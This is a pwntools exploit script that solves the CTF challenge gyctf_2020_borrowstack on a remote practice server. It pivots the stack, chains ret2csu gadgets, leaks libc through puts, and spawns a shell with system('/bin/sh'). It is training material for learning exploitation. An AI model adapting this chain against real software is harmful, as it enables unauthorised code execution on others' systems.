#Made by fly_autumn
#x64  4 * stack_pivoting
from pwn import *
#p = process("./gyctf_2020_borrowstack")
p = remote("node5.buuoj.cn",27428)
elf = ELF("./gyctf_2020_borrowstack")
context(os="linux",arch="amd64")
libc = ELF("./libc.so.6")

puts_plt = elf.plt["puts"]
puts_got = elf.got["puts"]
read_got = elf.got["read"]
leave_ret = 0x400699
pop_rdi = 0x400703
bank_addr = 0x601080
csu1 = 0x4006f6
csu2 = 0x4006e0
test_addr = 0x601e00
test2_addr = 0x601c00
pop_rbp = 0x400590
def make_csu(more,rbx,rbp,r12,r13,r14,r15):
    payload = p64(more) + p64(rbx) + p64(rbp) + p64(r12) + p64(r13) + p64(r14) + p64(r15)
    return payload
    #more = 0,rbx = 0,rbp = 1,r12 = func_addr,r13->rdx,r14->rsi,r15->rdi

p.recv()
payload1 = b"\x00" * 96 + p64(bank_addr) + p64(leave_ret)
p.send(payload1)
p.recv()
payload2 = p64(0) + p64(csu1) + make_csu(0,0,1,read_got,200,test_addr,0) + p64(csu2) + make_csu(0,0,0,0,0,0,0)  + p64(pop_rbp) + p64(test_addr) + p64(leave_ret)
p.sendline(payload2)
payload3 = p64(0) + p64(pop_rdi) + p64(puts_got) + p64(puts_plt) + p64(csu1) + make_csu(0,0,1,read_got,100,test2_addr,0) + p64(csu2) + make_csu(0,0,0,0,0,0,0) + p64(pop_rbp) + p64(test2_addr) + p64(leave_ret)
p.sendline(payload3)

puts_addr = u64(p.recvuntil(b"\x7f")[-6:].ljust(8,b"\x00"))
log.success("puts addr: "+hex(puts_addr))
libc_addr = puts_addr - libc.sym["puts"]
log.success("libc addr: "+hex(libc_addr))
sys_addr = libc_addr + libc.sym["system"]
log.success("system addr: "+hex(sys_addr))
sh_addr = libc_addr + next(libc.search(b"/bin/sh"))
log.success("sh addr: "+hex(sh_addr))

payload4 = p64(0) + p64(pop_rdi) + p64(sh_addr) + p64(sys_addr)
p.sendline(payload4)

p.interactive()
